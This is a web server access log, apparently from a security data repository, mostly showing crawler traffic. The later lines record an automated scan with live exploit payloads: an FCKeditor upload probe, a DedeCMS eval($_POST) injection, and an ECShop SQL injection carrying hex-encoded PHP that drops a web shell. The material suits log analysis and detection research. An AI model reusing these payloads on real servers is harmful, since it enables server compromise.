77.75.77.32 - - [24/Apr/2019:15:45:38 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 304 166 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)" 
123.125.67.226 - - [24/Apr/2019:15:54:08 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
220.181.108.115 - - [24/Apr/2019:15:54:10 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
123.125.67.160 - - [24/Apr/2019:15:54:12 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
220.181.108.80 - - [24/Apr/2019:15:55:54 -0700] "GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1" 200 11799731 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
220.181.108.83 - - [24/Apr/2019:15:55:57 -0700] "GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1" 200 36158360 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
41.223.160.131 - - [24/Apr/2019:15:58:32 -0700] "GET /tg/tg_snort_fast.7z HTTP/1.1" 304 131 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
49.140.187.1 - - [24/Apr/2019:16:08:05 -0700] "HEAD /GitHub-Mark.png HTTP/1.1" 200 215 "http://www.secrepo.com/" "curl/7.19.7 (x86_64-redhat-linux-gnu) libcurl/7.19.7 (ICE), Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
49.140.187.1 - - [24/Apr/2019:16:08:05 -0700] "HEAD /twitter-icon.png HTTP/1.1" 200 216 "http://www.secrepo.com/" "curl/7.19.7 (x86_64-redhat-linux-gnu) libcurl/7.19.7 (ICE), Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
115.239.212.138 - - [24/Apr/2019:16:08:06 -0700] "GET / HTTP/1.1" 200 12511 "http://www.baidu.com/s?wd=gettingsy8" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0" 
122.247.179.178 - - [24/Apr/2019:16:17:37 -0700] "POST /FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F HTTP/1.1" 404 295 "http://www.secrepo.com/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.179.178 - - [24/Apr/2019:16:17:37 -0700] "GET /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 404 294 "http://www.secrepo.com/index.php?m=member&c=index&a=register&siteid=1" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.179.178 - - [24/Apr/2019:16:17:38 -0700] "POST /admin_aspcms/_system/AspCms_SiteSetting.asp HTTP/1.1" 404 294 "http://www.secrepo.com/admin_aspcms/_system/AspCms_SiteSetting.asp" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.179.178 - - [24/Apr/2019:16:17:38 -0700] "GET /plus/moon.php HTTP/1.1" 404 294 "http://www.secrepo.com/plus/moon.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.179.178 - - [24/Apr/2019:16:17:38 -0700] "POST /plus/90sec.php HTTP/1.1" 404 294 "http://www.secrepo.com/plus/90sec.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.179.178 - - [24/Apr/2019:16:17:38 -0700] "POST /utility/convert/index.php?a=config&source=d7.2_x2.0 HTTP/1.1" 404 294 "http://www.secrepo.com/utility/convert/index.php?a=config&source=d7.2_x2.0" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.179.178 - - [24/Apr/2019:16:17:38 -0700] "POST /utility/convert/data/config.inc.php HTTP/1.1" 404 294 "http://www.secrepo.com/utility/convert/data/config.inc.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.179.178 - - [24/Apr/2019:16:17:39 -0700] "GET /uploads/dede/sys_verifies.php?action=getfiles&refiles%5B0%5D=123&refiles%5B1%5D=%5C%22;eval($_POST%5Bysy%5D);die();// HTTP/1.1" 404 294 "http://www.secrepo.com/uploads/dede/sys_verifies.php?action=getfiles&refiles[0]=123&refiles[1]=\\%22;eval($_POST[ysy]);die();//" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.179.178 - - [24/Apr/2019:16:17:39 -0700] "POST /uploads/dede/sys_verifies.php?action=down HTTP/1.1" 404 294 "http://www.secrepo.com/uploads/dede/sys_verifies.php?action=down" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.179.178 - - [24/Apr/2019:16:17:39 -0700] "POST /index.php/api/Uploadify/preview HTTP/1.1" 404 294 "http://www.secrepo.com/index.php/api/Uploadify/preview" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.179.178 - - [24/Apr/2019:16:17:39 -0700] "GET /user.php?act=login HTTP/1.1" 404 294 "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:288:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A325A6B5A334575634768774A79776E50443977614841675A585A686243676B583142505531526262475678645630704F79412F506963702729293B2F2F7D787878,10-- -\";s:2:\"id\";s:3:\"'/*\";}" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.179.178 - - [24/Apr/2019:16:17:40 -0700] "POST /fdgq.php HTTP/1.1" 404 294 "http://www.secrepo.com/fdgq.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
